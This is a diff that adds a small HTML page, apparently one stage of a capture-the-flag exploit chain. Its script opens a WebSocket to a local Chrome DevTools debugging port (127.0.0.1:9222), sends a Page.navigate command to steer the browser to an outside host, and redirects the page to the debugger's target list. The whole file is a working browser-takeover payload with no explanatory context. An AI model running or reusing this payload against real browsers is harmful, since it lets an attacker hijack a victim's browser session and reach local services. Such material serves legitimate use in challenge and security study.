@@ -1,0 +1,28 @@
+<html>
+  <script>
+  setTimeout(() => {
+    window.location = "http://127.0.0.1:9222/json/list"
+  }, 3000);
+  var ws;
+  let onopen = () => {
+    ws.send(JSON.stringify({
+          id: 54,
+          method: "Page.navigate",
+          params: {
+            url: "http://cscg.defgh.accesscam.org:8000/step3",
+            referrer: ""
+          }
+    }));
+  };
+
+  ws = new WebSocket("ws://127.0.0.1:9222/devtools/page/{{ target }}");
+  ws.onopen = onopen;
+  ws.onerror = e => {
+    ws = new WebSocket("ws://127.0.0.1:9222/devtools/page/{{ target }}");
+    ws.onopen = onopen;
+  }
+  if (ws.readyState == 1) {
+    onopen();
+  }
+  </script>
+</html>
